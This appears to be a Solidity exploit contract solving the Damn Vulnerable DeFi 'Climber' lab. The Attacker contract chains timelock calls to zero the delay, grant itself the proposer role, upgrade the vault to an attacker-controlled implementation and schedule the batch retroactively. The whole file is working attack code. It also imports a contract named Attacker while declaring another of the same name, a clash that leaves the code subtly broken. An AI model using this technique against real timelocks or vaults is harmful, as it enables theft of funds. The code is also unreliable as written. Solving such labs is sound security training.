// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UpgradedVault} from "./UpgradedVault.sol";
import {Attacker} from "./Attacker.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract Attacker {
    ClimberTimelock timelock;
    ClimberVault vault;
    UpgradedVault upgradedVault;
    address player;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, UpgradedVault _upgradedVault, address _player) {
        timelock = _timelock;
        player = _player;
        vault = _vault;
        upgradedVault = _upgradedVault;
    }
    function attack() external {
        
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = 0x00;
        bytes memory data = abi.encodeCall(UpgradedVault.changeSweeper, (player));
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(this);

        dataElements[0] = abi.encodeCall(timelock.updateDelay, 0);
        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));
        dataElements[2] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(upgradedVault), data));
        dataElements[3] = abi.encodeCall(Attacker.attack, ());

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        timelock.schedule(targets, values, dataElements, salt);
    }
}